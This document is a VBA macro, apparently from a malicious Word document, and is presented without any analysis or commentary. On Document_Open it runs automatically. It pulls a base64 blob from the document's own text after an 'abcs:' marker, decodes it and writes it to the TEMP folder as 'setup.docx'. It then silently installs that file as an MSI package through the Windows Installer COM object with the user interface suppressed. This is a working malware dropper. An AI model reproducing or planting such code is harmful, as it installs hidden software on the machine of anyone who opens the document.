Sub Document_Open()
    ExtractAbcxToFile
    RunMSI_COM
End Sub


Sub ExtractAbcxToFile()
    Dim docText As String
    Dim startPos As Long
    Dim result As String
    Dim filePath As String

    docText = ActiveDocument.Content.Text
    startPos = InStr(1, docText, "abcs:", vbTextCompare)

    If startPos = 0 Then
        
        Exit Sub
    End If

    result = Mid(docText, startPos + Len("abcs:"))

    result = Split(result, vbCr)(0)

    Dim fileBytes() As Byte
    fileBytes = Base64Decode(result)

    filePath = Environ("TEMP") & "\setup.docx"
    WriteBytesToFile filePath, fileBytes
End Sub

Function Base64Decode(ByVal base64String As String) As Byte()
    Dim xmlObj As Object
    Dim nodeObj As Object

    Set xmlObj = CreateObject("MSXML2.DOMDocument")
    Set nodeObj = xmlObj.createElement("b64")

    nodeObj.DataType = "bin.base64"
    nodeObj.Text = base64String

    Base64Decode = nodeObj.nodeTypedValue
End Function

Sub WriteBytesToFile(filePath As String, fileBytes() As Byte)
    Dim stream As Object

    Set stream = CreateObject("ADODB.Stream")

    stream.Type = 1 '
    stream.Open
    stream.Write fileBytes
    stream.SaveToFile filePath, 2 
    stream.Close
End Sub

Sub RunMSI_COM()
    Dim installer As Object
    Dim filePath As String
    
    Set installer = CreateObject("WindowsInstaller.Installer")
    filePath = Environ("TEMP") & "\setup.docx"
    
    installer.InstallProduct filePath, "ACTION=INSTALL UILevel=0"
End Sub


